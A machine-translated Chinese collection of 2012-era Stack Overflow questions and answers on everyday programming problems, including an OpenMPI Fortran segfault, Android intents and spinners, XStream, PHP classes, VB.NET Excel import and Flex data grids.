我正在使用 OpenMPI 1.4.3 和 gfortran 4.4.5。

```
PROGRAM mpitest
USE mpi
IMPLICIT NONE

INTEGER :: ierr, npe, rnk, win
INTEGER (KIND=MPI_ADDRESS_KIND) lowerbound, sizeofreal
REAL :: val = 1.0, oval = 2.0

CALL MPI_INIT( ierr )
CALL MPI_COMM_RANK( MPI_COMM_WORLD, rnk, ierr )
CALL MPI_COMM_SIZE( MPI_COMM_WORLD, npe, ierr )

CALL MPI_TYPE_GET_EXTENT(MPI_REAL, lowerbound, sizeofreal, ierr)

CALL MPI_WIN_CREATE(val, sizeofreal, sizeofreal, MPI_INFO_NULL, MPI_COMM_WORLD, win, ierr)

IF( rnk .EQ. 1 ) THEN
   CALL MPI_WIN_LOCK( MPI_LOCK_SHARED, 0, 0, win, ierr )
   CALL MPI_GET( oval, 1, MPI_REAL, 0, 0, 1, MPI_REAL, win, ierr )
   CALL MPI_WIN_UNLOCK( 0, win, ierr )
END IF

CALL MPI_BARRIER( MPI_COMM_WORLD, ierr )
CALL MPI_WIN_FREE(win, ierr)
CALL MPI_FINALIZE(ierr)

END PROGRAM mpitest

mpif90 mpitest.f90
mpirun -n 2 ./a.out

*** Process received signal ***
Signal: Segmentation fault (11)
Signal code: Address not mapped (1)
Failing at address: 0x34006020a0
[ 0] /lib/x86_64-linux-gnu/libc.so.6(+0x36420) [0x7f2d1c8c1420]
[ 1] /lib/x86_64-linux-gnu/libc.so.6(+0x13ae70) [0x7f2d1c9c5e70]
[ 2] /usr/lib/libmpi.so.0(ompi_convertor_pack+0x199) [0x7f2d1c61d629]
[ 3] /usr/lib/openmpi/lib/openmpi/mca_osc_pt2pt.so(+0x56b0) [0x7f2d166876b0]
[ 4] /usr/lib/openmpi/lib/openmpi/mca_osc_pt2pt.so(+0x3a81) [0x7f2d16685a81]
[ 5] /usr/lib/openmpi/lib/openmpi/mca_osc_pt2pt.so(+0x23ac) [0x7f2d166843ac]
[ 6] /usr/lib/libopen-pal.so.0(opal_progress+0x5b) [0x7f2d1ba700db]
[ 7] /usr/lib/libmpi.so.0(+0x35635) [0x7f2d1c60f635]
[ 8] /usr/lib/openmpi/lib/openmpi/mca_coll_tuned.so(+0x1afa) [0x7f2d1688eafa]
[ 9] /usr/lib/openmpi/lib/openmpi/mca_coll_tuned.so(+0x958f) [0x7f2d1689658f]
[10] /usr/lib/libmpi.so.0(MPI_Barrier+0x8d) [0x7f2d1c6250cd]
[11] /usr/lib/libmpi_f77.so.0(PMPI_BARRIER+0x13) [0x7f2d1cf661d3]
[12] ./a.out() [0x401003]
[13] ./a.out(main+0x34) [0x401058]
[14] /lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xed) [0x7f2d1c8ac30d]
[15] ./a.out() [0x400da9]
*** End of error message *** 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-15T14:46:43.210

这是一个棘手的问题，但线索来自以下事实：段错误发生在一个不相关且完全安全的例程中，`MPI_Barrier()`. 问题是存在堆栈损坏。

根本问题只是参数类型不匹配（我希望 MPI Fortran 绑定能够捕获，但没有）。[MPI_Get](http://www.open-mpi.org/doc/v1.4/man3/MPI_Get.3.php)的目标位移参数是kind的整数`MPI_ADDRESS_KIND`，但您只是传递给它一个整数。

如果您将`lowerbound`其用作目标偏移量，或者将传入的 0 显式提升为 MPI_ADDRESS_KIND 类型，则您的程序可以正常工作。

# android - Android 活动意图启动

> ID：11052422
> 
> 赞同：0
> 
> 时间：2012-06-15T14:16:38.503
> 
> 标签：android, android-activity, android-intent, task

我在一个愚蠢的问题上被困了几个小时。

我的应用程序由 2 个活动组成：A（主）和 B。还有一个服务 S。“正常”任务堆栈是 AB，S 在后台运行。

当我想通过通知直接到达活动 B 时，就会出现我的问题。我必须构造任务堆栈以获取 AB 以保持返回按钮的默认行为。（我希望用户可以回到 A）。

因为我使用了 API 7，所以我不能使用 android 开发者教程[http://developer.android.com/guide/topics/ui/notifiers/notifications.html](http://developer.android.com/guide/topics/ui/notifiers/notifications.html)中所示的意图数组。所以我决定在通知发送的意图中添加一个自定义操作（S.ACTION_CUSTOM），以便在活动 A 的 onCreate() 中区分这种情况。

与服务 S 中声明的通知相关联的意图：

```
Intent notificationIntent = new Intent(this, A.class);
       notificationIntent.setAction(ACTION_CUSTOM); 
```

现在在 A 中，在 onCreate() 方法的末尾，我添加：

```
if (S.ACTION_CUSTOM.equals(getIntent().getAction())) {
        Intent intent = new Intent(this, B.class);
        intent.setAction(S.ACTION_CUSTOM);
        startActivity(intent); 
 } 
```

此代码用于从通知直接转到 B 并授权返回 A。但是一旦我使用了通知“快捷方式”，则在应用程序启动时直接到达 B，即使是从主菜单也是如此。我已经尝试了很多事情来了解会发生什么，但即使我在 A 中的 if 语句末尾添加 getIntent().setAction(ANYTHING)，行为也是一样的。

谁能告诉我我的代码发生了什么？Morover 我对另一种实现愿望的方法持开放态度。

谢谢。

编辑：

XML清单的一部分：

```
<activity
        android:name=".A"
        android:label="@string/app_name" >
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
</activity>
<activity
        android:name=".B"
        android:label="@string/app_name" >
</activity> 
```

但我认为意图过滤器与我的问题无关。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T22:26:27.053

通过更多的测试，我找到了原因和解决方案。

事实上，当我说我从主菜单重新启动应用程序时，这不是真的。我从“最近的活动”（长按主页）中重新启动了它。但是，在这种情况下，似乎 android 会以运行它的最后一个意图启动应用程序。所以它在家里可以正常工作（因为 Intent.ACTION_MAIN 的新意图是触发），但不是来自最近的活动，因为与先前具有相同操作的意图被一次又一次地触发（在我的情况下为 ACTION_CUSTOM）。

为了将意图与“最近的活动”和“通知”区分开来，我使用了标志。对于最近的活动，意图具有标志 Intent.FLAG_ACTIVITY_LAUNCED_FROM_HISTORY。

所以我通过在 if 语句中添加一个条件来修复我的代码：

```
if (S.ACTION_CUSTOM.equals(getIntent().getAction()) && (getIntent().getFlags() & Intent.FLAG_ACTIVITY_LAUNCHED_FROM_HISTORY) == 0) {
        startActivity(getIntent().setClass(this, B.class));  
} 
```

我的真实代码有点复杂，有 4 个活动而不是 2 个，但一切正常，每个活动都将意图传递给下一个活动。堆栈构建良好，当用户从通知以外的其他地方启动应用程序时，会保留默认行为。

希望这将帮助某人避免浪费时间来理解为什么意图看起来很疯狂。

# java - Java XStream - 如何忽略某些元素

> ID：11052423
> 
> 赞同：10
> 
> 时间：2012-06-15T14:16:40.653
> 
> 标签：java, xstream

我有以下 XML：

```
<xml version="1.0" encoding="UTF-8"?> 
<osm version="0.6" generator="CGImap 0.0.2">
 <bounds minlat="48.1400000" minlon="11.5400000" maxlat="48.1450000" maxlon="11.5430000"/>
 <node id="398692" lat="48.1452196" lon="11.5414971" user="Peter14" uid="13832" visible="true" version="18" changeset="10762013" timestamp="2012-02-22T18:59:41Z">
 </node>
 <node id="1956100" lat="48.1434822" lon="11.5487963" user="Peter14" uid="13832" visible="true" version="41" changeset="10762013" timestamp="2012-02-22T18:59:39Z">
  <tag k="crossing" v="traffic_signals"/>
  <tag k="highway" v="traffic_signals"/>
  <tag k="TMC:cid_58:tabcd_1:Class" v="Point"/>
  <tag k="TMC:cid_58:tabcd_1:Direction" v="positive"/>
  <tag k="TMC:cid_58:tabcd_1:LCLversion" v="9.00"/>
  <tag k="TMC:cid_58:tabcd_1:LocationCode" v="35356"/>
  <tag k="TMC:cid_58:tabcd_1:NextLocationCode" v="35357"/>
  <tag k="TMC:cid_58:tabcd_1:PrevLocationCode" v="35355"/>
 </node>
</osm> 
```

我只想将元素（节点）映射到一个对象，但我遇到了问题：

1.  它抱怨边界元素，因为我不想映射它们。
2.  并非所有人`nodes`都有`tags`，所以我遇到了一些问题。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-09-19T09:58:15.940

不幸的是，这里提到的覆盖 Mapper 行为不适用于隐式集合或注释。我检查了 1.4.3 版。所以我发现的明显解决方案是用省略注释来模拟被忽略的字段。对我来说很完美，但每次都创建它们有点无聊。

```
@XStreamOmitField
private Object ignoredElement; 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2014-07-17T12:00:26.757

Since XStream 1.4.5 durring marshaller declaration it's enough to use ignoreEnknownElements() method:

```
XStreamMarshaller marshaller = new XStreamMarshaller();
marshaller.getXStream().ignoreUnknownElements();
... 
```

to ignore unnecessary elements.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-04-20T03:49:20.207

只需在 Xtream 减速后定义下面的匿名类。

```
XStream xstream = new XStream(new DomDriver()){  
            protected MapperWrapper wrapMapper(MapperWrapper next) {
                return new MapperWrapper(next) {
                    public boolean shouldSerializeMember(Class definedIn, String fieldName) {
                        try {
                            return definedIn != Object.class || realClass(fieldName) != null;
                        } catch(CannotResolveClassException cnrce) {
                            return false;
                        }
                    }
                };
            }
        }; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-15T14:20:06.977

普通的谷歌搜索揭示了很多 ioptions。这是其中之一：

[http://rafaelsteil.com/omit-unexpected-xml-elements-with-xstream/](http://rafaelsteil.com/omit-unexpected-xml-elements-with-xstream/)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-11-20T12:17:04.903

您可以通过覆盖默认编组器来做到这一点。

```
import org.springframework.oxm.xstream.XStreamMarshaller;

import com.thoughtworks.xstream.XStream;
import com.thoughtworks.xstream.mapper.MapperWrapper;

public class CustomXStreamMarshaller extends XStreamMarshaller {

@Override
protected XStream constructXStream() {
    // The referenced XStream constructor has been deprecated as of 1.4.5.
    // We're preserving this call for broader XStream 1.4.x compatibility.
    return new XStream() {
        @Override
        protected MapperWrapper wrapMapper(MapperWrapper next) {
                return new MapperWrapper(next) {
                    @Override
                    public boolean shouldSerializeMember(Class definedIn, String fieldName) {
                        if (definedIn == Object.class) {
                            return false;
                        }
                        return super.shouldSerializeMember(definedIn, fieldName);
                    }
                };
        }
    };
}} 
```

# osgi - 对 OSGi 4.3 版和 Felix 感到困惑

> ID：11052428
> 
> 赞同：3
> 
> 时间：2012-06-15T14:16:57.010
> 
> 标签：osgi, equinox, apache-felix

我不太了解最新的 Apache Felix 版本（4.0.2）的 OSGi 版本。

我读过 Apache Felix 4 符合 OSGi 4.3，我*认为*这意味着 Felix 框架包将导出 org.osgi.framework 版本 1.6.0。

它没有，快速查看 Felix 的清单表明它导出版本 1.5.0，因此（至少）其中一个假设是错误的。如果我检查 Equinox 3.7，我*会*看到 org.osgi.framework 版本 1.6.0 的导出

谁能指出我正确的方向？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-16T13:19:00.150

你一定是看错了导出。Felix 4 是一个兼容 OSGi R4.3 的框架，它确实导出了`org.osgi.framework`1.6.0 版本。

**2014 年 10 月 23 日更新**

以上指的是 Felix 4.2 版本，这是当时可用的最高版本。当前版本的 Felix (4.4) 现在支持 OSGi Release 5 API。

# php - PHP 在多个类中工作

> ID：11052435
> 
> 赞同：0
> 
> 时间：2012-06-15T14:17:15.277
> 
> 标签：php, class

我有一个名为 DBhelper 的类，现在我创建了一个名为 UserManager 的新类。我需要 UserManager 具有 GetUserId() 和 CheckValidation() 之类的功能。所以我需要 DBhelper 来执行这些数据库操作。但我发现它不像这样工作：

```
require_once('DBhelper.php');
class User{
  public $databaseHelper = new DBhelper();//syntax error
  public $DB = $databaseHelper->connectDB();//syntax error

  public function GetUserId(){
    $this->databasesHelper->RunSql();//syntax error
    ...
  }
  public function CheckValidation(){
    $this->databasesHelper->RunSql();//syntax error
    ...
  }
} 
```

请阻止我，我已经在互联网上搜索了很长时间。谢谢。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-15T14:20:38.817

尝试这样的事情，它使用[依赖注入](http://en.wikipedia.org/wiki/Dependency_injection)设计模式。

```
class User {
    private $db;
    public function __construct(DBHelper $db) {
         $this->db = $db->connectDB();
    }

    public function GetUserId(){
        $this->db->RunSql();
    }

} 
```

这是您实例化它的方式：

```
// Assuming: require( 'DBhelper.php');
$dbh = new DBHelper();
$user = new User( $dbh); 
```

另外，要解决您的错误，这些是错误（请注意，它们不是语法错误，因为它们在语法上是正确的）：

```
public $databaseHelper = new DBhelper();//syntax error
public $DB = $databaseHelper->connectDB();//syntax error 
```

因为您不能将成员变量初始化为非静态值。因此，由于在编译时这些值是未知的，因此这是一个错误。

同样，这些调用：

```
$this->databasesHelper->RunSql();//syntax error 
```

无效，因为`$databasesHelper`从未使用适当的对象实例化。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-15T14:22:10.860

您需要在构造函数或其他适当的方法中实例化您的实例变量。您不能像以前那样声明和实例化实例变量。

您的代码应该看起来更像这样：

```
require_once('DBhelper.php');
class User{
  public $databaseHelper;
  public $DB;

  public function User(){
    $this->databaseHelper = new DBHelper();
    $this->DB = $this->databaseHelper->connectDB();
  }
  public function GetUserId(){
    $this->databaseHelper->RunSql();//syntax error
    ...
  }
  public function CheckValidation(){
    $this->databaseHelper->RunSql();//syntax error
    ...
  }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-15T14:26:19.020

我也做过和你一样的事情。但我已将我的 db 类声明如下；

```
public class MySqlDatabase
{

private static $connection;

public static function openConnection()
{
    self::$connection = mysql_connect(DB_SERVER, DB_USER, DB_PASS);
    if(!self::$connection)
    {
        throw new Exception("Connection failed to database");
    }

    mysql_select_db(DB_NAME, self::$connection);
}

public static function closeConnection()
{
    if(isset(self::$connection))
    {
        mysql_close(self::$connection);
    }
}

public static function executeQuery($query)
    {
        $result = mysql_query($query, self::$connection);
        if(!$result)
        {
            throw new Exception("Query execution failed. " . $query);
        }

        return $result;
    }
} 
```

在我的另一个班级里，我这样称呼他们；

```
MySqlDatabase::openConnection();
MySqlDatabase::executeQuery();
MySqlDatabase::closeConnection(); 
```

所以，我说将您的数据库连接逻辑声明为静态的。这将非常容易访问

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-15T14:22:13.560

您可能不想在您的类之外公开数据库类，您可以在构造函数中实例化它们。事件更好，您可以将它们传递给构造函数，这样 User 类甚至不需要知道如何实例化它们 - 食物链更高的东西可以处理它们的创建（特别是如果您稍后会有另一个像 User 这样需要的类他们）。

```
class User{
  private $databaseHelper;
  private $DB;

  public function __construct() {
      $this->databaseHelper = new DBhelper();
      $DB = $databaseHelper->connectDB();
  }

  public function GetUserId(){
    $this->databasesHelper->RunSql();
    ...
  }
  public function CheckValidation(){
    $this->databasesHelper->RunSql();
    ...
  }
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-06-15T14:22:41.117

您不能为属性分配这样的值。
创建一个构造函数并在那里分配默认值

# vb.net - 导入excel表时读取列

> ID：11052439
> 
> 赞同：1
> 
> 时间：2012-06-15T14:17:23.403
> 
> 标签：vb.net, excel

我正在将一个 excel 表导入我的 sql 数据库。一切正常，但我想将列标题作为静态值读取。不知道该怎么做。这是我用来阅读表格的代码：

```
 'Connection String to Excel Workbook   
    Dim excelConnectionString As String = "Provider=Microsoft.ACE.OLEDB.12.0;Data Source=" & MyFile & ";Extended Properties=""Excel 12.0;HDR=Yes;"""

    ' Create Connection to Excel Workbook   
    Using connection As New System.Data.OleDb.OleDbConnection(excelConnectionString)

        'List columns you need from the Excel file   
        Dim command As New System.Data.OleDb.OleDbCommand("Select * FROM [" & txtSheetName.Text & "$]", connection)
        connection.Open()

        ' Create DbDataReader to Data Worksheet   
        Using dr As System.Data.OleDb.OleDbDataReader = command.ExecuteReader()

            Dim strSql As String = ""

            strSql = "INSERT INTO tblMine (" & _
                    "Header1, Field1, Field2 " & _
                     ") VALUES (" & _
                    "Header1, Field1, Field2)"

            Try
                If dr.HasRows() Then

                    While dr.Read()

                        If Convert.ToString(dr.Item(1)) <> "" Then

                            Dim cmd As New SqlClient.SqlCommand
                            cmd.Connection = cn
                            cmd.CommandType = CommandType.Text
                            cmd.CommandText = strSql
                            'DataTable1.Columns[0].ColumnName 
                            cmd.Parameters.Add("@Header1", SqlDbType.VarChar).Value = ???
                            cmd.Parameters.Add("@Field1", SqlDbType.VarChar).Value = Convert.ToString(dr.Item(0))
                            cmd.Parameters.Add("@Field2", SqlDbType.Int).Value = Convert.ToInt32(dr.Item(1))

                            cmd.ExecuteScalar()

                        End If

                    End While

                End If 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T14:50:50.190

不是一个非常干净的代码，但这给出了 Header1 （或第一行中的名称，您的工作表的第一列名为 `[" & txtSheetName.Text & "$]"`

```
Dim cmd2 As OleDbCommand = New OleDbCommand("SELECT * FROM [" & txtSheetName.Text & "$] where 1=0", connection)
Dim da As OleDbDataAdapter = new OleDbDataAdapter(cmd2)
Dim dt As DataTable = new DataTable()
da.Fill(dt)
string header1 = dt.Columns(0).ColumnName 
```

一点优化

```
 Dim cmd As New SqlClient.SqlCommand
     cmd.Connection = cn
     cmd.CommandType = CommandType.Text
     cmd.CommandText = strSql
     cmd.Parameters.AddWithValue("@Header1", header1) ' this is invariant
     cmd.Parameters.AddWithValue("@Field1", string.Empty) ' this is a dummy value
     cmd.Parameters.AddWithValue("@Field2", 0)  ' this is a dummy value
     While dr.Read()
         If Convert.ToString(dr.Item(1)) <> "" Then
              cmd.Parameters("@Field1").Value = Convert.ToString(dr.Item(0))
              cmd.Parameters("@Field2").Value = Convert.ToInt32(dr.Item(1))
              cmd.ExecuteScalar()
         End If
    End While 
```

# javascript - Javascript 按钮在 IE 中不起作用；在其他浏览器中工作

> ID：11052441
> 
> 赞同：0
> 
> 时间：2012-06-15T14:17:42.827
> 
> 标签：javascript, arrays, internet-explorer, google-chrome, button

让 javascript 按钮在 IE 中工作时遇到问题。我使用 javascript 创建了一个按钮，该按钮使用从预先确定的数组中随机选择的文本来刷新我的页面。它在 Firefox、Chrome 和 Safari 中完美运行，但在 IE 中不适用。在 IE 中，没有任何刷新。

谁能帮我解决这个问题，以便这个 Javascript 在 IE 中工作？

```
<html>

<head>
    <title>WTF </title>         
</head>

<style type="text/css">

#reason {font-family: "Helvetica", serif; color: white; }

button{
color:#08233e;
font:2.4em Futura, ‘Century Gothic’, AppleGothic, sans-serif;
font-size:70%;
padding:14px;
background:url(overlay.png) repeat-x center #ffcc00;
background-color:rgba(255,204,0,1);
border:1px solid #ffcc00;
-moz-border-radius:10px;
-webkit-border-radius:10px;
border-radius:10px;
border-bottom:1px solid #9f9f9f;
-moz-box-shadow:inset 0 1px 0 rgba(255,255,255,0.5);
-webkit-box-shadow:inset 0 1px 0 rgba(255,255,255,0.5);
box-shadow:inset 0 1px 0 rgba(255,255,255,0.5);
cursor:pointer;
}

button:hover{background-color:rgba(255,204,0,0.8);}

</style>

<body>

    <div class="con">
        <p id="reason" >
    <center><script language="JavaScript">
    var r_text = new Array ();
r_text[0] = "Sample 1";
r_text[1] = "Sample 2";
r_text[2] = "Sample 3";
var i = Math.floor(3*Math.random())
document.write(r_text[i]);
</script>
</p>
<br>   
<a href="" class="button1"><button>TELL ME MORE</button></a><br>
</div> 

</body>

</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:33:48.250

这是刷新页面的错误方法。看看[这个问题](https://stackoverflow.com/questions/2624111/preferred-method-to-reload-page-with-javascript)。尝试改变它，看看它是否工作得更好。此外，“中心”标签已[弃用](https://stackoverflow.com/questions/1798817/why-is-the-center-tag-deprecated-in-html)，因此最好不要使用它。像这样声明数组会更容易：

```
r_text = ['Sample 1', 'Sample 2', 'Sample 3']; 
```

# android - 如何将微调器默认设置为从另一个屏幕获取的字符串

> ID：11052444
> 
> 赞同：0
> 
> 时间：2012-06-15T14:17:50.027
> 
> 标签：android, android-spinner

我想要做的是，我要求用户从列表视图中选择一个值，然后他被重定向到另一个屏幕，该屏幕具有用户选择的默认微调器。我已经阅读了很多关于微调器默认设置的帖子，但没有一个包括从另一个屏幕获取信息，无论如何我都尝试过，但它们没有用。

这就是我从 WorkEntryScreenActivity.java 传递字符串的方式

```
//inside onCreate
mListView.setOnItemClickListener(new OnItemClickListener() {
                public void onItemClick(AdapterView<?> myAdapter, View myView, 
                        int myItemInt, long mylng) {
                  selectedFromList = (String) (mListView.getItemAtPosition(myItemInt));
                  top10 = true;
                  call(top10);  }

            });

//outside onCreate
protected void call(boolean top10){
    if(top10) {
    Intent i = new Intent(this, WorkEntryActivity.class);   
        i.putExtra("FromTab", "true");
        i.putExtra("workRequest",selectedFromList);
        startActivity(i);
        finish();
    }
   } 
```

在另一个 java 文件 WorkEntryActivity.java

```
//get the string
workRequestFetched = extras.getString("workRequest");

//This is where I need help
ArrayList<String> workRequestAdded = new ArrayList<String>();
        workRequestSpinner = (Spinner) findViewById(R.id.workRequestSpinner);

        if(workRequestFetched != null){

            workRequestAdded.add(workRequestFetched);
        }

        ArrayList<String> workRequests = ServiceCall.workRequests;

        workRequestAdded.addAll(workRequests);

        final ArrayAdapter<String> workRequestAdapter = new ArrayAdapter<String>(this,
                android.R.layout.simple_spinner_item,
                 workRequestAdded);

        workRequestAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);

        workRequestSpinner.setAdapter(workRequestAdapter); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T14:24:21.097

如果我没记错的话，微调器的默认选项是与其关联的字符串数组中的第一个选项。如果您将 workRequest 作为字符串数组中的第一个选项，它应该是默认选项。

编辑：经过一番谷歌搜索后，您似乎无法以编程方式修改 res/Strings.xml。但是，如果没有办法将相关 java 文件中定义的字符串数组链接到微调器，我会感到惊讶。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-15T14:38:03.763

首先，您必须使用 遍历`myAdap`适配器，`myAdap.getItem(position)`并找出适配器项中的哪个字符串与字符串匹配`workRequest`。一旦您能够获取该项目，您就可以使用`workRequestSpinner.setSelection(THE_POSITION_OF_MATCHED_STRING)`.

希望回答对你有所帮助。

# asp.net-mvc - Ajax 获取 JSOn 数据不起作用

> ID：11052448
> 
> 赞同：0
> 
> 时间：2012-06-15T14:17:58.913
> 
> 标签：asp.net-mvc, jquery

我正在尝试通过 Ajax 调用 MVC 方法。客户端代码如下：

```
 var serviceUrl = "/Regions/GetRegionPoints";

$.get(serviceUrl, { id:region_id}, function (data) { alert("Data Loaded: " + data); }); 
```

我的 MVC 方法是：

```
 public JsonResult GetRegionPoints(string id)
    {
        var model = GetRegionPoints();
        if (model.Any())
        {
            return new JsonResult(){Data = model};
        }
        return new JsonResult();
    } 
```

我可以看到客户端调用了 Ajax，然后调用了我的操作，但是没有成功并且客户端上没有数据（ alert("data loaded") ）没有被调用。

问题是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:24:30.743

这可能是因为您使用的是 GET 方法，如果是这样，您必须返回这样的结果（当然，如果 javascript 是正确的并且该方法被触发）

```
return new JsonResult()
{                
     // Some Data
     JsonRequestBehavior = JsonRequestBehavior.AllowGet
}; 
```

# apache-flex - 为什么 Alert.show() 给我两个警报框？

> ID：11052451
> 
> 赞同：2
> 
> 时间：2012-06-15T14:18:01.220
> 
> 标签：apache-flex

当我`Alert.show`在一个需要`DataGridEvent`.

执行时`Alert.show`，函数运行两次。

这是代码：

```
private function onItemEnd(event:DataGridEvent):void
{

    var pattern:RegExp =/[^a-z0-9A-ZéèçàêïôëËÉÊÈìíîïÌÍÎÏÇùúûü]/;
    var res:Boolean=pattern.test(texteSaisi);
    if(res==true){
        event.reason = DataGridEventReason.CANCELLED; 
        Alert.show("Le nom de l'option ne doit pas contenir des caractère spéciaux."); 
    }else{ 
        if (event.dataField == "libelle"){
            question.libelle = texteSaisi;
        }else if (event.dataField == "description") {
            question.description = texteSaisi;
        } 
```

* * *

```
<mx:DataGrid 
    draggableColumns="false" 
    dataProvider = "{model.obtenirListeOptionsTarificationProposition}" 
    id = "gridOptions"
    rowCount = "10" 
    doubleClickEnabled = "true"
    itemClick = "onItemClick(event)" 
    change = "onChange(event)"
    width = "80%" 
    editable = "true"
    itemEditEnd = "onItemEnd(event)"> 
```

调用此函数时，屏幕上有两个警报，我不知道为什么。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T21:47:50.397

我怀疑将警报与`itemEditEnd`事件结合使用是有问题的。写了一个简单的测试用例，它的行为不同（我的似乎进入了一个无限循环）。

问题是这样的：

1.  该`itemEditEnd`事件可以通过多种方式分派：键盘交互（在编辑单元格时按 Tab 键或按 Enter）、鼠标交互等。

2.  我开始编辑一个单元格。然后我点击选项卡/输入或单击另一个单元格。这会生成`itemEditEnd`事件**并将**焦点移动到新的可编辑单元格。

3.  在事件的事件处理程序中`itemEditEnd`，`Alert`显示一个。此弹出窗口会从该可编辑单元格中移除焦点......从而调度第二个`itemEditEnd`事件。

在下面的测试应用程序中，我实际上创建了一个无限循环。

如果您需要在事件发生后显示警报`itemEditEnd`，也许您可​​以在事件处理程序中放置一些逻辑（以便第二次立即返回）。

```
<?xml version="1.0" encoding="utf-8"?>
<s:Application xmlns:fx="http://ns.adobe.com/mxml/2009" 
               xmlns:s="library://ns.adobe.com/flex/spark" 
               xmlns:mx="library://ns.adobe.com/flex/mx"
               minWidth="955" minHeight="600"
               creationComplete="onCreationComplete()">

    <fx:Script>
        <![CDATA[
            import mx.collections.ArrayCollection;
            import mx.controls.Alert;

            private function onCreationComplete():void
            {
                grid.dataProvider=createCollection();
            }

            private function createCollection():ArrayCollection
            {
                var tmp:Array = [];
                for (var i:int = 1; i<11; i++)
                {
                    tmp.push({ data: Math.random()*100, label: i.toString() + " label" });
                }
                return new ArrayCollection(tmp);
            }

            private function onItemEditEnd():void
            {
                Alert.show("item edit end");
            }

        ]]>
    </fx:Script>

    <mx:DataGrid id="grid" itemEditEnd="onItemEditEnd()" editable="true" />

</s:Application> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T13:34:13.983

我通过在第一次触发警报时将布尔值设置为 true 来解决此问题，然后如果用户尝试更改 onter 行中的另一个项目，我在 on click 处理程序中将其设置为 false。

谢谢你的帮助；）

# php - 构建 Web 应用程序

> ID：11052455
> 
> 赞同：-3
> 
> 时间：2012-06-15T14:18:07.570
> 
> 标签：php

我已经使用 wordpress 一年了，无论出于何种目的对其进行逆向工程。

我受够了。我想使用我预先确定并选择并将我的网站连接到它们的表来构建下一个项目。我知道我在用 PHP 做什么，但不知道 SQL；我也很乐意在 PHPmyADMIN 中构建表格。我精通 CSS、HTML、JS 等...

所以我正在寻找的是一组工具来帮助我完成这项任务，这些工具提供了读取和写入数据库登录等的基本功能。但没有什么像 wordpress 那样复杂和有针对性。

我在找什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T14:22:18.550

纯粹是主观的回答，但[CodeIgniter](http://codeigniter.com/)和[Yii](http://www.yiiframework.com/)是众所周知的并且支持起点。

如果您熟悉 CMS，那么 Joomla[**只有**](http://api.joomla.org/li_Joomla-Platform.html). 我们有一个人在做这个工作，并且经常参考 Joomla CMS 来获取示例和实现想法，但除了框架之外，它是纯自定义代码。

# flash - 如何更新 TextFlow.paragraph.span 对象并让它反映在视图上？

> ID：11052462
> 
> 赞同：0
> 
> 时间：2012-06-15T14:18:33.490
> 
> 标签：flash, apache-flex

我创建了一个 Flex TextArea。在 ActionScript 中创建了一个 ParagraphElement，然后创建了 Span 元素：

```
<s:TextArea id="te"/>

...

pe = new ParagraphElement();
se = new SpanElement();

se.text = "banana";
pe.addChild(se);
te.addChild(pe); 
```

一切似乎都很好。我在舞台上看到一根香蕉。后来我尝试更新 se 的值（它是一个类变量）并且更改没有反映在舞台上。

```
se.text = "apple"; 
```

或者

```
se.replaceText(0, se.text.length, "apple"); 
```

我真的需要能够更新 SpanElement！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T15:19:56.427

我找到了我的答案。希望这将帮助其他人更快地找到它。

在我的应用程序中，我实际上是在创建多个 SpanElement 并将它们添加到单个段落中。当试图改变其中一个元素时，值会改变但不会反映。ParagraphElement 将所有这些 SpanElement 组合成一个（新）元素，因此我对我创建的 SpanElement 的引用实际上不再被使用。

我的解决方案是为我想展示的每个 SpanElement 创建一个新的 ParagraphElement。它制造了两倍多的物体，但按照我的预期行事。

# java - 将 pcm 样本链接在一起时避免静态和失真

> ID：11052463
> 
> 赞同：0
> 
> 时间：2012-06-15T14:18:42.640
> 
> 标签：java, audio, pcm

我遇到了将来自录音不同部分的 pcm 音频样本拼接在一起的问题。这个想法是，它是来自用户通过各种进度条上的记录寻找的音频反馈。它们可以是任意长度（例如 0.1 到 0.5 秒）。我的主要问题是，当我回放这些样本时，它们会导致大量的噪声伪影、失真等。

我想这是样本之间幅度跳跃的结果。我还没有想出解决这个问题的好方法。我做的最后一件事是尝试在它们穿过原点的点截断样本（从正到负，反之亦然），但这并没有太大帮助。有人有想法么？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-16T17:13:44.047

“过零”技巧通常效果很好，短的线性或余弦衰减（~1/30 秒）也是如此。如果您使用淡入淡出，淡入淡出必须足够长以避免爆音，但仍比您正在处理的音频片段短得多。如果您使用过零，则必须确保您正在处理的音频实际上过零（这对于低频和已经偏移的信号可能是一个问题。为了避免偏移，这两个问题，您可以高首先通过过滤信号）。

如果您的片段经常处于 0.1 到 0.5 毫秒范围的短端，则可能会出现各种心理声学现象。您应该首先将自己限制在更长的部分，看看它是否有效，然后看看你能做多短。这样你就知道问题出在你的代码上还是只是让它变短了。

# sql - 在 Sybase 存储过程中连接两个字符串

> ID：11052471
> 
> 赞同：2
> 
> 时间：2012-06-15T14:18:50.853
> 
> 标签：sql, stored-procedures, sap-ase

